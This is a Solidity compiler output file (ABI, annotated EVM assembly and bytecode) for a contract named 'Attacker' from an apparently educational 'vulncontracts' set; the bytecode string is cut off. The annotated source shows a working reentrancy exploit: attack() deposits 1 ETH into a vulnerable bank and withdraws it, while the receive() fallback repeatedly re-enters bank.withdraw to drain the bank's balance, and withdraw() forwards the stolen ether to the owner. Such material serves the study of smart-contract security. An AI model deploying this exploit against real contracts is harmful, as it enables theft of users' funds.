{
	"vulncontracts/vuln1_exploit.sol": {
		"Attacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_bankAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackAmount",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "bank",
					"outputs": [
						{
							"internalType": "contract IVulnerableBank",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdraw",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"vulncontracts/vuln1_exploit.sol\":175:923  contract Attacker {... */\n  mstore(0x40, 0x80)\n    /* \"vulncontracts/vuln1_exploit.sol\":285:292  1 ether */\n  0x0de0b6b3a7640000\n    /* \"vulncontracts/vuln1_exploit.sol\":258:292  uint public attackAmount = 1 ether */\n  0x02\n  sstore\n    /* \"vulncontracts/vuln1_exploit.sol\":299:414  constructor(address _bankAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"vulncontracts/vuln1_exploit.sol\":351:361  msg.sender */\n  caller\n    /* \"vulncontracts/vuln1_exploit.sol\":343:348  owner */\n  0x00\n  0x00\n    /* \"vulncontracts/vuln1_exploit.sol\":343:361  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"vulncontracts/vuln1_exploit.sol\":394:406  _bankAddress */\n  dup1\n    /* \"vulncontracts/vuln1_exploit.sol\":371:375  bank */\n  0x01\n  0x00\n    /* \"vulncontracts/vuln1_exploit.sol\":371:407  bank = IVulnerableBank(_bankAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"vulncontracts/vuln1_exploit.sol\":299:414  constructor(address _bankAddress) {... */\n  pop\n    /* \"vulncontracts/vuln1_exploit.sol\":175:923  contract Attacker {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"vulncontracts/vuln1_exploit.sol\":175:923  contract Attacker {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"vulncontracts/vuln1_exploit.sol\":175:923  contract Attacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3ccfd60b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x76cdb03b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x88193565\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"vulncontracts/vuln1_exploit.sol\":554:566  attackAmount */\n      sload(0x02)\n        /* \"vulncontracts/vuln1_exploit.sol\":537:541  bank */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"vulncontracts/vuln1_exploit.sol\":529:550  address(bank).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"vulncontracts/vuln1_exploit.sol\":529:566  address(bank).balance >= attackAmount */\n      lt\n        /* \"vulncontracts/vuln1_exploit.sol\":525:620  if (address(bank).balance >= attackAmount) {... */\n      tag_10\n      jumpi\n        /* \"vulncontracts/vuln1_exploit.sol\":582:586  bank */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"vulncontracts/vuln1_exploit.sol\":582:595  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"vulncontracts/vuln1_exploit.sol\":596:608  attackAmount */\n      sload(0x02)\n        /* \"vulncontracts/vuln1_exploit.sol\":582:609  bank.withdraw(attackAmount) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      revert(0x00, 0x00)\n    tag_13:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_15:\n      pop\n      pop\n      pop\n      pop\n        /* \"vulncontracts/vuln1_exploit.sol\":525:620  if (address(bank).balance >= attackAmount) {... */\n    tag_10:\n        /* \"vulncontracts/vuln1_exploit.sol\":175:923  contract Attacker {... */\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"vulncontracts/vuln1_exploit.sol\":829:921  function withdraw() external {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      revert(0x00, 0x00)\n    tag_16:\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      stop\n        /* \"vulncontracts/vuln1_exploit.sol\":225:252  IVulnerableBank public bank */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_19\n      jumpi\n      revert(0x00, 0x00)\n    tag_19:\n      pop\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"vulncontracts/vuln1_exploit.sol\":258:292  uint public attackAmount = 1 ether */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_24\n      jumpi\n      revert(0x00, 0x00)\n    tag_24:\n      pop\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      tag_27\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"vulncontracts/vuln1_exploit.sol\":199:219  address public owner */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_28\n      jumpi\n      revert(0x00, 0x00)\n    tag_28:\n      pop\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      tag_31\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"vulncontracts/vuln1_exploit.sol\":632:823  function attack() external payable {... */\n    tag_7:\n      tag_33\n      tag_34\n      jump\t// in\n    tag_33:\n      stop\n        /* \"vulncontracts/vuln1_exploit.sol\":829:921  function withdraw() external {... */\n    tag_18:\n        /* \"vulncontracts/vuln1_exploit.sol\":876:881  owner */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"vulncontracts/vuln1_exploit.sol\":868:891  payable(owner).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"vulncontracts/vuln1_exploit.sol\":868:914  payable(owner).transfer(address(this).balance) */\n      0x08fc\n        /* \"vulncontracts/vuln1_exploit.sol\":892:913  address(this).balance */\n      selfbalance\n        /* \"vulncontracts/vuln1_exploit.sol\":868:914  payable(owner).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_37:\n      pop\n        /* \"vulncontracts/vuln1_exploit.sol\":829:921  function withdraw() external {... */\n      jump\t// out\n        /* \"vulncontracts/vuln1_exploit.sol\":225:252  IVulnerableBank public bank */\n    tag_21:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"vulncontracts/vuln1_exploit.sol\":258:292  uint public attackAmount = 1 ether */\n    tag_26:\n      sload(0x02)\n      dup2\n      jump\t// out\n        /* \"vulncontracts/vuln1_exploit.sol\":199:219  address public owner */\n    tag_30:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"vulncontracts/vuln1_exploit.sol\":632:823  function attack() external payable {... */\n    tag_34:\n        /* \"vulncontracts/vuln1_exploit.sol\":698:710  attackAmount */\n      sload(0x02)\n        /* \"vulncontracts/vuln1_exploit.sol\":685:694  msg.value */\n      callvalue\n        /* \"vulncontracts/vuln1_exploit.sol\":685:710  msg.value >= attackAmount */\n      lt\n      iszero\n        /* \"vulncontracts/vuln1_exploit.sol\":677:734  require(msg.value >= attackAmount, \"Need at least 1 ETH\") */\n      tag_39\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_40\n      swap1\n      tag_41\n      jump\t// in\n    tag_40:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_39:\n        /* \"vulncontracts/vuln1_exploit.sol\":744:748  bank */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"vulncontracts/vuln1_exploit.sol\":744:756  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"vulncontracts/vuln1_exploit.sol\":764:776  attackAmount */\n      sload(0x02)\n        /* \"vulncontracts/vuln1_exploit.sol\":744:779  bank.deposit{value: attackAmount}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_42\n      jumpi\n      revert(0x00, 0x00)\n    tag_42:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_44\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_44:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"vulncontracts/vuln1_exploit.sol\":789:793  bank */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"vulncontracts/vuln1_exploit.sol\":789:802  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"vulncontracts/vuln1_exploit.sol\":803:815  attackAmount */\n      sload(0x02)\n        /* \"vulncontracts/vuln1_exploit.sol\":789:816  bank.withdraw(attackAmount) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_45\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_45:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_46\n      jumpi\n      revert(0x00, 0x00)\n    tag_46:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_48:\n      pop\n      pop\n      pop\n      pop\n        /* \"vulncontracts/vuln1_exploit.sol\":632:823  function attack() external payable {... */\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_49:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_50:\n        /* \"#utility.yul\":177:201   */\n      tag_65\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_49\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_12:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_67\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_50\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:568   */\n    tag_51:\n        /* \"#utility.yul\":479:486   */\n      0x00\n        /* \"#utility.yul\":519:561   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":512:517   */\n      dup3\n        /* \"#utility.yul\":508:562   */\n      and\n        /* \"#utility.yul\":497:562   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:568   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":574:634   */\n    tag_52:\n        /* \"#utility.yul\":602:605   */\n      0x00\n        /* \"#utility.yul\":623:628   */\n      dup2\n        /* \"#utility.yul\":616:628   */\n      swap1\n      pop\n        /* \"#utility.yul\":574:634   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":640:782   */\n    tag_53:\n        /* \"#utility.yul\":690:699   */\n      0x00\n        /* \"#utility.yul\":723:776   */\n      tag_71\n        /* \"#utility.yul\":741:775   */\n      tag_72\n        /* \"#utility.yul\":750:774   */\n      tag_73\n        /* \"#utility.yul\":768:773   */\n      dup5\n        /* \"#utility.yul\":750:774   */\n      tag_51\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":741:775   */\n      tag_52\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":723:776   */\n      tag_51\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":710:776   */\n      swap1\n      pop\n        /* \"#utility.yul\":640:782   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":788:914   */\n    tag_54:\n        /* \"#utility.yul\":838:847   */\n      0x00\n        /* \"#utility.yul\":871:908   */\n      tag_75\n        /* \"#utility.yul\":902:907   */\n      dup3\n        /* \"#utility.yul\":871:908   */\n      tag_53\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":858:908   */\n      swap1\n      pop\n        /* \"#utility.yul\":788:914   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":920:1068   */\n    tag_55:\n        /* \"#utility.yul\":992:1001   */\n      0x00\n        /* \"#utility.yul\":1025:1062   */\n      tag_77\n        /* \"#utility.yul\":1056:1061   */\n      dup3\n        /* \"#utility.yul\":1025:1062   */\n      tag_54\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":1012:1062   */\n      swap1\n      pop\n        /* \"#utility.yul\":920:1068   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1074:1249   */\n    tag_56:\n        /* \"#utility.yul\":1183:1242   */\n      tag_79\n        /* \"#utility.yul\":1236:1241   */\n      dup2\n        /* \"#utility.yul\":1183:1242   */\n      tag_55\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":1178:1181   */\n      dup3\n        /* \"#utility.yul\":1171:1243   */\n      mstore\n        /* \"#utility.yul\":1074:1249   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1255:1521   */\n    tag_23:\n        /* \"#utility.yul\":1370:1374   */\n      0x00\n        /* \"#utility.yul\":1408:1410   */\n      0x20\n        /* \"#utility.yul\":1397:1406   */\n      dup3\n        /* \"#utility.yul\":1393:1411   */\n      add\n        /* \"#utility.yul\":1385:1411   */\n      swap1\n      pop\n        /* \"#utility.yul\":1421:1514   */\n      tag_81\n        /* \"#utility.yul\":1511:1512   */\n      0x00\n        /* \"#utility.yul\":1500:1509   */\n      dup4\n        /* \"#utility.yul\":1496:1513   */\n      add\n        /* \"#utility.yul\":1487:1493   */\n      dup5\n        /* \"#utility.yul\":1421:1514   */\n      tag_56\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":1255:1521   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1527:1623   */\n    tag_57:\n        /* \"#utility.yul\":1564:1571   */\n      0x00\n        /* \"#utility.yul\":1593:1617   */\n      tag_83\n        /* \"#utility.yul\":1611:1616   */\n      dup3\n        /* \"#utility.yul\":1593:1617   */\n      tag_51\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":1582:1617   */\n      swap1\n      pop\n        /* \"#utility.yul\":1527:1623   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1629:1747   */\n    tag_58:\n        /* \"#utility.yul\":1716:1740   */\n      tag_85\n        /* \"#utility.yul\":1734:1739   */\n      dup2\n        /* \"#utility.yul\":1716:1740   */\n      tag_57\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":1711:1714   */\n      dup3\n        /* \"#utility.yul\":1704:1741   */\n      mstore\n        /* \"#utility.yul\":1629:1747   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1753:1975   */\n    tag_32:\n        /* \"#utility.yul\":1846:1850   */\n      0x00\n        /* \"#utility.yul\":1884:1886   */\n      0x20\n        /* \"#utility.yul\":1873:1882   */\n      dup3\n        /* \"#utility.yul\":1869:1887   */\n      add\n        /* \"#utility.yul\":1861:1887   */\n      swap1\n      pop\n        /* \"#utility.yul\":1897:1968   */\n      tag_87\n        /* \"#utility.yul\":1965:1966   */\n      0x00\n        /* \"#utility.yul\":1954:1963   */\n      dup4\n        /* \"#utility.yul\":1950:1967   */\n      add\n        /* \"#utility.yul\":1941:1947   */\n      dup5\n        /* \"#utility.yul\":1897:1968   */\n      tag_58\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":1753:1975   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1981:2150   */\n    tag_59:\n        /* \"#utility.yul\":2065:2076   */\n      0x00\n        /* \"#utility.yul\":2099:2105   */\n      dup3\n        /* \"#utility.yul\":2094:2097   */\n      dup3\n        /* \"#utility.yul\":2087:2106   */\n      mstore\n        /* \"#utility.yul\":2139:2143   */\n      0x20\n        /* \"#utility.yul\":2134:2137   */\n      dup3\n        /* \"#utility.yul\":2130:2144   */\n      add\n        /* \"#utility.yul\":2115:2144   */\n      swap1\n      pop\n        /* \"#utility.yul\":1981:2150   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2156:2325   */\n    tag_60:\n        /* \"#utility.yul\":2296:2317   */\n      0x4e656564206174206c6561737420312045544800000000000000000000000000\n        /* \"#utility.yul\":2292:2293   */\n      0x00\n        /* \"#utility.yul\":2284:2290   */\n      dup3\n        /* \"#utility.yul\":2280:2294   */\n      add\n        /* \"#utility.yul\":2273:2318   */\n      mstore\n        /* \"#utility.yul\":2156:2325   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2331:2697   */\n    tag_61:\n        /* \"#utility.yul\":2473:2476   */\n      0x00\n        /* \"#utility.yul\":2494:2561   */\n      tag_91\n        /* \"#utility.yul\":2558:2560   */\n      0x13\n        /* \"#utility.yul\":2553:2556   */\n      dup4\n        /* \"#utility.yul\":2494:2561   */\n      tag_59\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":2487:2561   */\n      swap2\n      pop\n        /* \"#utility.yul\":2570:2663   */\n      tag_92\n        /* \"#utility.yul\":2659:2662   */\n      dup3\n        /* \"#utility.yul\":2570:2663   */\n      tag_60\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":2688:2690   */\n      0x20\n        /* \"#utility.yul\":2683:2686   */\n      dup3\n        /* \"#utility.yul\":2679:2691   */\n      add\n        /* \"#utility.yul\":2672:2691   */\n      swap1\n      pop\n        /* \"#utility.yul\":2331:2697   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2703:3122   */\n    tag_41:\n        /* \"#utility.yul\":2869:2873   */\n      0x00\n        /* \"#utility.yul\":2907:2909   */\n      0x20\n        /* \"#utility.yul\":2896:2905   */\n      dup3\n        /* \"#utility.yul\":2892:2910   */\n      add\n        /* \"#utility.yul\":2884:2910   */\n      swap1\n      pop\n        /* \"#utility.yul\":2956:2965   */\n      dup2\n        /* \"#utility.yul\":2950:2954   */\n      dup2\n        /* \"#utility.yul\":2946:2966   */\n      sub\n        /* \"#utility.yul\":2942:2943   */\n      0x00\n        /* \"#utility.yul\":2931:2940   */\n      dup4\n        /* \"#utility.yul\":2927:2944   */\n      add\n        /* \"#utility.yul\":2920:2967   */\n      mstore\n        /* \"#utility.yul\":2984:3115   */\n      tag_94\n        /* \"#utility.yul\":3110:3114   */\n      dup2\n        /* \"#utility.yul\":2984:3115   */\n      tag_61\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":2976:3115   */\n      swap1\n      pop\n        /* \"#utility.yul\":2703:3122   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220bb2163ed5c92163aaf418e67fca0590ca05740869aa98d265b102c6527647f3464736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052670de0b6b3a764000060025534801561001b575f5ffd5b506040516106c93803806106c9833981810160405281019061003d9190610120565b335f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061014b565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100ef826100c6565b9050919050565b6100ff816100e5565b8114610109575f5ffd5b50565b5f8151905061011a816100f6565b92915050565b5f60208284031215610135576101346100c2565b5b5f6101428482850161010c565b91505092915050565b610571806101585f395ff3fe60806040526004361061004d575f3560e01c80633ccfd60b1461012357806376cdb03b1461013957806388193565146101635780638da5cb5b1461018d5780639e5faafc146101b75761011f565b3661011f5760025460015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061011d5760015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6002546040518263ffffffff1660e01b81526004016100ef91906103de565b5f604051808303815f87803b158015610106575f5ffd5b505af1158015610118573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b34801561012e575f5ffd5b506101376101c1565b005b348015610144575f5ffd5b5061014d610227565b60405161015a9190610471565b60405180910390f35b34801561016e575f5ffd5b5061017761024c565b60405161018491906103de565b60405180910390f35b348015610198575f5ffd5b506101a1610252565b6040516101ae91906104aa565b60405180910390f35b6101bf610276565b005b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f19350505050158015610224573d5f5f3e3d5ffd5b50565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6002543410156102bb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102b29061051d565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db06002546040518263ffffffff1660e01b81526004015f604051808303818588803b158015610324575f5ffd5b505af1158015610336573d5f5f3e3d5ffd5b505050505060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1